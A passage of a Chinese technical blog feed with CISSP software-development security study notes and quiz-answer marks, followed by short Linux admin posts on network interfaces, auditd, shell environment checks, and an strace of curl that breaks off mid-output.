规则或学习规则：很多层次的求和，每一层的求和都需要加权信息。</p><p>基于知识的分析技术主要优点：</p><p>快速做出一致的决策</p><p>安全性问题：</p><p>不能为了寻找异常而对大量的日志记录和审计踪迹数据进行一致的、彻底的分析。</p><h1 id="20-5-本章小结"><a href="#20-5-本章小结" class="headerlink" title="20.5 本章小结"></a>20.5 本章小结</h1><h1 id="20-6-考试要点"><a href="#20-6-考试要点" class="headerlink" title="20.6 考试要点"></a>20.6 考试要点</h1><h2 id="解释关系数据库管理系统（RDBMS）的基本架构"><a href="#解释关系数据库管理系统（RDBMS）的基本架构" class="headerlink" title="解释关系数据库管理系统（RDBMS）的基本架构"></a>解释关系数据库管理系统（RDBMS）的基本架构</h2><p>了解关系数据库的结构。</p><p>能够解释表（关系）、行（记录&#x2F;元组）和列（字段&#x2F;属性）的功能。</p><p>知道如何在表和各种类型的键间定义关系。</p><p>描述由聚合和推理形成的数据库安全威胁。</p><h2 id="解释专家系统、机器学习和神经网络如何工作"><a href="#解释专家系统、机器学习和神经网络如何工作" class="headerlink" title="解释专家系统、机器学习和神经网络如何工作"></a>解释专家系统、机器学习和神经网络如何工作</h2><p>专家系统包括两个主要组件：</p><p>包含一系列 if&#x2F;then 规则的知识库；使用知识库信息得到其他数据的推理引擎。</p><p>机器学习技术试图通过算法从数据中发现知识。</p><p>神经网络模拟人类大脑的运作，在有限的范围内通过安排一系列的分层计算来解决问题。</p><p>神经网络需要针对特定问题进行大量训练，然后才能提供解决方案。</p><h2 id="理解系统开发的模型"><a href="#理解系统开发的模型" class="headerlink" title="理解系统开发的模型"></a>理解系统开发的模型</h2><p><strong>瀑布模型</strong>描述了一个连续的开发过程，结果是最终产品的开发。</p><p>如果发现错误，开发人员只能回退到上个阶段。</p><p><strong>螺旋模型</strong>反复使用几个瀑布模型，从而生成多个详细说明的和经过完全测试的原型。</p><p><strong>敏捷开发模型</strong>将重点放在客户的需求上，快速开发新功能，以迭代方式满足这些需求。</p><h2 id="解释敏捷软件开发中的-Scrum-方法"><a href="#解释敏捷软件开发中的-Scrum-方法" class="headerlink" title="解释敏捷软件开发中的 Scrum 方法"></a>解释敏捷软件开发中的 Scrum 方法</h2><p>Scrum 是实现敏捷哲学的一种有组织的方法。</p><p>它依靠每天的 Scrum 会议来组织和审查工作。</p><p>开发集中于交付成品的短时间的活动冲刺。</p><p>集成产品团队（IPT）是美国国防部采用这一方法的早期成果。</p><h2 id="描述软件开发成熟度模型"><a href="#描述软件开发成熟度模型" class="headerlink" title="描述软件开发成熟度模型"></a>描述软件开发成熟度模型</h2><p>知道成熟度模型旨在通过将临时的、混乱的软件过程发展为成熟的、规范的软件开发过程，从而帮助组织提高软件开发过程的成熟度和质量。</p><p>能够描述 SW-CMM、IDEAL 和 SAMM 模型。</p><h2 id="理解变更和配置管理的重要性"><a href="#理解变更和配置管理的重要性" class="headerlink" title="理解变更和配置管理的重要性"></a>理解变更和配置管理的重要性</h2><p>知道变更管理流程的三个基本组件–请求控制、变更控制和发布控制，以及它们如何有助于安全。</p><p>解释配置管理如何控制组织中使用的软件版本。</p><p>理解变更的审核和记录是如何抑制组织风险的。</p><h2 id="理解测试的重要性"><a href="#理解测试的重要性" class="headerlink" title="理解测试的重要性"></a>理解测试的重要性</h2><p>软件测试应当被设计为软件开发过程的一部分。</p><p>软件测试应当作为改善设计、开发和生产过程的管理工具。</p><h2 id="解释-DevOps-和-DevSecOps-在现代企业中的作用"><a href="#解释-DevOps-和-DevSecOps-在现代企业中的作用" class="headerlink" title="解释 DevOps 和 DevSecOps 在现代企业中的作用"></a>解释 DevOps 和 DevSecOps 在现代企业中的作用</h2><p>DevOps 方法通过支持团队之间的自动化和协作，寻求集成软件开发和 IT 运营。</p><p>DevSecOps 方法通过在集成模型中引入安全运营活动，扩展了 DevOps 模型。</p><p>持续集成和交付（CI&#x2F;CD）技术使 DevOps 和 DevSecOps 管道自动化。</p><h2 id="了解不同编码工具在软件开发生态系统中的作用"><a href="#了解不同编码工具在软件开发生态系统中的作用" class="headerlink" title="了解不同编码工具在软件开发生态系统中的作用"></a>了解不同编码工具在软件开发生态系统中的作用</h2><p>开发者用不同的编程语言编写代码，然后将代码编译成机器语言或通过解释器执行。</p><p>开发人员可以使用软件开发工具集和集成开发环境来促进代码编写过程。</p><p>软件库创建共享和可重用的代码，而代码仓库为软件开发过程提供了管理平台。</p><h2 id="解释采购软件对组织的影响"><a href="#解释采购软件对组织的影响" class="headerlink" title="解释采购软件对组织的影响"></a>解释采购软件对组织的影响</h2><p>组织可以购买商用现货（COTS）软件来满足其需求，也可使用免费开源软件（OSS）。</p><p>相关软件都扩展了潜在的攻击面，需要进行安全审查和</p><h1 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h1><p>变更和配置管理</p><p>SAMM</p><p>污染</p><p>A</p><p>B</p><p>C</p><p>C</p><p>B</p><p>B</p><p>C</p><p>D</p><p>A</p><p>D</p><p>C</p><p>D</p><p>B</p><p>A</p><p>A</p><p>C</p><p>D</p><p>C</p><p>C</p><p>B</p><p>A✅</p><p>B✅</p><p>A❌ C</p><p>​请求控制为用户提供了请求变更的框架，为开发人员提供了对这些请求进行优先级排序的机会</p><p>​配置控制确保根据变更和配置管理策略对软件版本进行更改</p><p>​请求控制为用户请求变更提供了一个有组织的框架</p><p>​变更审计用于确保生产和环境和变更记录一致</p><p>C✅</p><p>C❌ B</p><p>​迭代瀑布</p><p>B✅</p><p>C✅</p><p>A❌ D</p><p>​聚合攻击涉及使用专门的数据库函数组合大量数据库记录信息，以揭示可能比单个记录中信息更敏感的信息。</p><p>​推理攻击使用演绎原理从现有数据得出结论。</p><p>​污染是高分类级别和低分类级别数据的混合</p><p>​多实例化是为不同安全级别的用户创建不同的数据库记录，相同主键值的多个记录插入具有不同分类即被的数据库中</p><p>​操控是对数据库中数据进行授权或未经授权的修改。</p><p>A❌ C</p><p>D✅</p><p>D❌ C</p><p>​专家系统使用由一系列 if&#x2F;then 语句组成的知识库来根据人类专家的先前经验做出决策。</p><p>C❌ D</p><p>​软件成熟度模型 SW-CMM 中，管理级（第 4 级）中，组织使用定量方法来获得对开发过程的详细了解。</p><p>B✅</p><p>A✅</p><p>A✅</p><p>​甘特图是一种条形图，显示了项目和调度之间随时间变化的相互关系</p><p>​PERT 图关注任务之间的相互关系，而不是调度的具体细节。</p><p>​条形图用于表示数据</p><p>​维恩图用于显示集合之间的关系。</p><p>C✅</p><p>B❌ D</p><p>​</p><p>C✅</p><p>A❌ C</p><p>​隔离性原则规定，在同一个数据上操作的两个事务必须临时彼此分离，以便一个事务不干扰另一个事务。</p><p>​原子性原则规定，如果事务的任何部分失败，必须回滚整个事务。</p><p>​一致性原则规定，数据库必须始终处于符合数据库模型规则的状态</p><p>​持久性原则规定，必须保留提交到数据库的事务。</p><p>B✅</p><p>​表的基数是指表的行数。</p><p>​表的度数是指表的列数。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>network_options</title>
    <link href="/2025/04/18/network/network_options/"/>
    <url>/2025/04/18/network/network_options/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="开启关闭网卡"><a href="#开启关闭网卡" class="headerlink" title="开启关闭网卡"></a>开启关闭网卡</h2><h3 id="关闭网卡"><a href="#关闭网卡" class="headerlink" title="关闭网卡"></a>关闭网卡</h3><p>ip link set eth0 down</p><p>ifdown eth0</p><h3 id="开启网卡"><a href="#开启网卡" class="headerlink" title="开启网卡"></a>开启网卡</h3><p>ip link set eth0 up</p><p>ifup eth0</p><h3 id="验证网卡状态"><a href="#验证网卡状态" class="headerlink" title="验证网卡状态"></a>验证网卡状态</h3><p>ip link show eth0</p><p>state DOWN mode：关闭</p><p>state UP mode：开启</p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>audit_base</title>
    <link href="/2025/04/10/security/osSec/os_monitor/audit_base/"/>
    <url>/2025/04/10/security/osSec/os_monitor/audit_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Linux Audit 是 Linux 系统中用于监控和记录系统活动的安全机制。</p><p>跟踪系统上的文件访问、用户操作、权限变更等事件。</p><h1 id="守护进程-auditd"><a href="#守护进程-auditd" class="headerlink" title="守护进程 auditd"></a>守护进程 auditd</h1><p>auditd 是 Linux audit 的核心守护进程，负责收集、存储和处理审计日志，可以根据配置文件中的规则监控系统事件</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sys_flood</title>
    <link href="/2025/04/09/security/netsec/ddos/syn_flood/"/>
    <url>/2025/04/09/security/netsec/ddos/syn_flood/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>修改服务器等待 ACK 包的时间</p><p>​如何修改，对服务有没有影响，是否需要重启，不同的服务有什么差别吗</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
      <category>ddos</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>ddos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>view_teminal_usershell</title>
    <link href="/2025/04/08/yunwei/yunweitips/view_terminal_useshell/"/>
    <url>/2025/04/08/yunwei/yunweitips/view_terminal_useshell/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="查看当前终端使用的shell环境"><a href="#查看当前终端使用的shell环境" class="headerlink" title="查看当前终端使用的shell环境"></a>查看当前终端使用的shell环境</h2><p>echo $SHELL</p><p><strong>Linux</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ /]# <span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span><br>/bin/bash<br></code></pre></td></tr></table></figure><p><strong>Mac</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp <span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span><br>/bin/zsh<br></code></pre></td></tr></table></figure><h2 id="查看当前系统支持的shell环境"><a href="#查看当前系统支持的shell环境" class="headerlink" title="查看当前系统支持的shell环境"></a>查看当前系统支持的shell环境</h2><p>cat &#x2F;etc&#x2F;shells</p><p><strong>Linux</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ /]# <span class="hljs-built_in">cat</span> /etc/shells<br>/bin/sh<br>/bin/bash<br>/usr/bin/sh<br>/usr/bin/bash<br>/usr/bin/tmux<br></code></pre></td></tr></table></figure><p><strong>Mac</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">➜  <span class="hljs-string">/tmp</span> cat <span class="hljs-string">/etc/shells</span> <br><span class="hljs-comment"># List of acceptable shells for chpass(1).</span><br><span class="hljs-comment"># Ftpd will not allow users to connect who are not using</span><br><span class="hljs-comment"># one of these shells.</span><br><br><span class="hljs-string">/bin/bash</span><br><span class="hljs-string">/bin/csh</span><br><span class="hljs-string">/bin/dash</span><br><span class="hljs-string">/bin/ksh</span><br><span class="hljs-string">/bin/sh</span><br><span class="hljs-string">/bin/tcsh</span><br><span class="hljs-string">/bin/zsh</span><br></code></pre></td></tr></table></figure><h2 id="查看当前-shell-pid"><a href="#查看当前-shell-pid" class="headerlink" title="查看当前 shell pid"></a>查看当前 shell pid</h2><p>echo $$</p><p><strong>Linux</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@ /]<span class="hljs-comment"># echo $$</span><br>784<br>[root@ /]<span class="hljs-comment"># ps -ef | grep 784</span><br>root      <span class="hljs-number"> 784 </span><span class="hljs-number"> 5571 </span><span class="hljs-number"> 0 </span>17:30 pts/8    00:00:00 -bash<br>root     <span class="hljs-number"> 5202 </span> <span class="hljs-number"> 784 </span><span class="hljs-number"> 0 </span>17:41 pts/8    00:00:00 ps -ef<br>root     <span class="hljs-number"> 5203 </span> <span class="hljs-number"> 784 </span><span class="hljs-number"> 0 </span>17:41 pts/8    00:00:00 grep --color=auto 784<br></code></pre></td></tr></table></figure><p><strong>Mac</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">➜  <span class="hljs-string">/tmp</span> <span class="hljs-keyword">echo</span> $$<br>16951<br>➜  <span class="hljs-string">/tmp</span> ps -ef | grep 16951<br>  501 16951 16942   0  5<span class="hljs-function">:38</span>下午 ttys003    0<span class="hljs-function">:00.51</span> -zsh<br>    0 17635 16951   0  5<span class="hljs-function">:41</span>下午 ttys003    0<span class="hljs-function">:00.01</span> ps -ef<br>  501 17636 16951   0  5<span class="hljs-function">:41</span>下午 ttys003    0<span class="hljs-function">:00.01</span> grep <span class="hljs-params">--color=auto</span> <span class="hljs-params">--exclude-dir=</span><span class="hljs-string">.bzr</span> <span class="hljs-params">--exclude-dir=CVS</span> <span class="hljs-params">--exclude-dir=</span><span class="hljs-string">.git</span> <span class="hljs-params">--exclude-dir=</span><span class="hljs-string">.hg</span> <span class="hljs-params">--exclude-dir=</span><span class="hljs-string">.svn</span> <span class="hljs-params">--exclude-dir=</span><span class="hljs-string">.idea</span> <span class="hljs-params">--exclude-dir=</span><span class="hljs-string">.tox</span> 16951<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweitips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>yunweitips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>audit_strace&amp;autrace</title>
    <link href="/2025/04/08/security/osSec/os_monitor/audit_strace&amp;autrace/"/>
    <url>/2025/04/08/security/osSec/os_monitor/audit_strace&amp;autrace/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="audit-strace"><a href="#audit-strace" class="headerlink" title="audit_strace"></a>audit_strace</h1><h2 id="audit-strace-部署安装"><a href="#audit-strace-部署安装" class="headerlink" title="audit_strace 部署安装"></a>audit_strace 部署安装</h2><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> strace -y<br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@-</span> /]# strace -V<br>strace -- version <span class="hljs-number">4.24</span><br>Copyright (<span class="hljs-keyword">c</span>) <span class="hljs-number">1991</span><span class="hljs-number">-2018</span> The strace developers &lt;https://strace.io&gt;.<br>This is <span class="hljs-keyword">free</span> software<span class="hljs-comment">; see the source for copying conditions.  There is NO</span><br>warranty<span class="hljs-comment">; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><br>Optional features enabled: stack-trace<span class="hljs-operator">=</span>libdw stack-demangle m<span class="hljs-number">32</span>-mpers mx<span class="hljs-number">32</span>-mpers<br></code></pre></td></tr></table></figure><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><h3 id="e"><a href="#e" class="headerlink" title="-e"></a>-e</h3><p>Filtering</p><h4 id="e-trace-network"><a href="#e-trace-network" class="headerlink" title="-e trace&#x3D;%network"></a>-e trace&#x3D;%network</h4><p>Trace all the network related system calls.跟踪所有与网络相关的系统调用</p><h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><h3 id="查看域名请求行为系统函数调用"><a href="#查看域名请求行为系统函数调用" class="headerlink" title="查看域名请求行为系统函数调用"></a>查看域名请求行为系统函数调用</h3><p>strace -e trace&#x3D;%network curl <a href="https://www.baidu.com/">https://www.baidu.com</a></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@ <span class="hljs-operator">/</span>]<span class="hljs-comment"># strace -e trace=%network curl https://www.baidu.com</span><br>socket(AF_INET6, SOCK_DGRAM, IPPROTO_IP) <span class="hljs-operator">=</span> <span class="hljs-number">3</span><br>socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) <span class="hljs-operator">=</span> <span class="hljs-number">3</span><br>setsockopt(<span class="hljs-number">3</span>, SOL_SOCKET, SO_KEEPALIVE, [<span class="hljs-number">1</span>], <span class="hljs-number">4</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>setsockopt(<span class="hljs-number">3</span>, SOL_TCP, TCP_KEEPIDLE, [<span class="hljs-number">60</span>], <span class="hljs-number">4</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>setsockopt(<span class="hljs-number">3</span>, SOL_TCP, TCP_KEEPINTVL, [<span class="hljs-number">60</span>], <span class="hljs-number">4</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>connect(<span class="hljs-number">3</span>, &#123;<span class="hljs-attr">sa_family</span><span class="hljs-operator">=</span>AF_INET, sin_port<span class="hljs-operator">=</span>htons(<span class="hljs-number">443</span>), sin_addr<span class="hljs-operator">=</span>inet_addr(<span class="hljs-string">&quot;220.181.111.232&quot;</span>)&#125;, <span class="hljs-number">16</span>) <span class="hljs-operator">=</span> <span class="hljs-operator">-</span><span class="hljs-number">1</span> EINPROGRESS (Operation now <span class="hljs-keyword">in</span> progress)<br>getsockopt(<span class="hljs-number">3</span>, SOL_SOCKET, SO_ERROR, [<span class="hljs-number">0</span>], [<span class="hljs-number">4</span>]) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>getpeername(<span class="hljs-number">3</span>, &#123;<span class="hljs-attr">sa_family</span><span class="hljs-operator">=</span>AF_INET, sin_port<span class="hljs-operator">=</span>htons(<span class="hljs-number">443</span>), sin_addr<span class="hljs-operator">=</span>inet_addr(<span class="hljs-string">&quot;220.181.111.232&quot;</span>)&#125;, [<span class="hljs-number">12</span>8<span class="hljs-operator">-&gt;</span><span class="hljs-number">16</span>]) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>getsockname(<span class="hljs-number">3</span>, &#123;<span class="hljs-attr">sa_family</span><span class="hljs-operator">=</span>AF_INET, sin_port<span class="hljs-operator">=</span>htons(<span class="hljs-number">15870</span>), sin_addr<span class="hljs-operator">=</span>inet_addr(<span class="hljs-string">&quot;10.185.16.237&quot;</span>)&#125;, [<span class="hljs-number">12</span>8<span class="hljs-operator">-&gt;</span><span class="hljs-number">16</span>]) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>socket(AF_INET, SOCK_STREAM, IPPROTO_IP) <span class="hljs-operator">=</span> <span class="hljs-number">6</span><br>getpeername(<span class="hljs-number">6</span>, <span class="hljs-number">0</span>x7ffc26d1fcf0, [<span class="hljs-number">112</span>])   <span class="hljs-operator">=</span> <span class="hljs-operator">-</span><span class="hljs-number">1</span> ENOTCONN (Transport endpoint is not connected)<br>getpeername(<span class="hljs-number">3</span>, &#123;<span class="hljs-attr">sa_family</span><span class="hljs-operator">=</span>AF_INET, sin_port<span class="hljs-operator">=</span>htons(<span class="hljs-number">443</span>), sin_addr<span class="hljs-operator">=</span>inet_addr(<span class="hljs-string">&quot;220.181.111.232&quot;</span>)&#125;, [<span class="hljs-number">11</span>2<span class="hljs-operator">-&gt;</span><span class="hljs-number">16</span>]) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>getpeername(<span class="hljs-number">3</span>, &#123;<span class="hljs-attr">sa_family</span><span class="hljs-operator">=</span>AF_INET, sin_port<span class="hljs-operator">=</span>htons(<span class="hljs-number">443</span>), sin_addr<span class="hljs-operator">=</span>inet_addr(<span class="hljs-string">&quot;220.181.111.232&quot;</span>)&#125;, [<span class="hljs-number">11</span>2<span class="hljs-operator">-&gt;</span><span class="hljs-number">16</span>]) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>sendto(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span>6<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\1</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\2</span>76<span class="hljs-char escape_">\1</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\2</span>72<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\3</span>x<span class="hljs-char escape_">\3</span>4<span class="hljs-char escape_">\3</span>3<span class="hljs-char escape_">\2</span>23<span class="hljs-char escape_">\3</span>02q<span class="hljs-char escape_">\2</span>7<span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\3</span>536=<span class="hljs-char escape_">\2</span>64<span class="hljs-char escape_">\3</span>42<span class="hljs-char escape_">\3</span>44<span class="hljs-char escape_">\2</span>20<span class="hljs-char escape_">\2</span>01m<span class="hljs-char escape_">\2</span>3<span class="hljs-char escape_">\2</span>27|Z&quot;</span>..., <span class="hljs-number">195</span>, <span class="hljs-number">0</span>, NULL, <span class="hljs-number">0</span>) <span class="hljs-operator">=</span> <span class="hljs-number">195</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>x13150c0, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-operator">-</span><span class="hljs-number">1</span> EAGAIN (Resource temporarily unavailable)<br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>x13150c0, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-operator">-</span><span class="hljs-number">1</span> EAGAIN (Resource temporarily unavailable)<br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span>6<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\0</span>W&quot;</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">5</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span>S<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\3</span>g<span class="hljs-char escape_">\3</span>64<span class="hljs-char escape_">\3</span>43g<span class="hljs-char escape_">\2</span>02<span class="hljs-char escape_">\2</span>17<span class="hljs-char escape_">\2</span>74<span class="hljs-char escape_">\3</span>07<span class="hljs-char escape_">\2</span>63<span class="hljs-char escape_">\3</span>62<span class="hljs-char escape_">\2</span>53<span class="hljs-char escape_">\3</span>65KY<span class="hljs-char escape_">\2</span>42<span class="hljs-char escape_">\2</span>50C4v<span class="hljs-char escape_">\3</span>61&#123;<span class="hljs-char escape_">\2</span>052z<span class="hljs-char escape_">\2</span>72<span class="hljs-char escape_">\3</span>06&quot;</span>..., <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">87</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span>6<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\2</span>2<span class="hljs-char escape_">\2</span>44&quot;</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">5</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\v</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\2</span>2<span class="hljs-char escape_">\2</span>40<span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\2</span>2<span class="hljs-char escape_">\2</span>35<span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\t</span><span class="hljs-char escape_">\3</span>600<span class="hljs-char escape_">\2</span>02<span class="hljs-char escape_">\t</span><span class="hljs-char escape_">\3</span>540<span class="hljs-char escape_">\2</span>02<span class="hljs-char escape_">\1</span>0<span class="hljs-char escape_">\3</span>24<span class="hljs-char escape_">\2</span>40<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\2</span><span class="hljs-char escape_">\1</span><span class="hljs-char escape_">\2</span><span class="hljs-char escape_">\2</span><span class="hljs-char escape_">\f</span>N@<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\2</span>46^<span class="hljs-char escape_">\2</span>66<span class="hljs-char escape_">\2</span>01&quot;</span>..., <span class="hljs-number">4772</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">4772</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span>6<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\1</span>M&quot;</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">5</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\f</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\1</span>I<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\2</span>7A<span class="hljs-char escape_">\4</span><span class="hljs-char escape_">\3</span>64t<span class="hljs-char escape_">\3</span>47<span class="hljs-char escape_">\2</span>70<span class="hljs-char escape_">\3</span>7<span class="hljs-char escape_">\3</span>3!<span class="hljs-char escape_">\2</span>52<span class="hljs-char escape_">\2</span>27<span class="hljs-char escape_">\2</span>30<span class="hljs-char escape_">\3</span>31&lt;<span class="hljs-char escape_">\1</span>/<span class="hljs-char escape_">\2</span>61<span class="hljs-char escape_">\3</span>36o(C<span class="hljs-char escape_">\1</span>77a<span class="hljs-char escape_">\3</span>60B&quot;</span>..., <span class="hljs-number">333</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">333</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span>6<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\4</span>&quot;</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">5</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\1</span>6<span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span>&quot;</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">4</span><br>sendto(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span>6<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\0</span>F<span class="hljs-char escape_">\2</span>0<span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span>BA<span class="hljs-char escape_">\4</span><span class="hljs-char escape_">\3</span>04<span class="hljs-char escape_">\3</span>2U<span class="hljs-char escape_">\2</span>63<span class="hljs-char escape_">\2</span>72u<span class="hljs-char 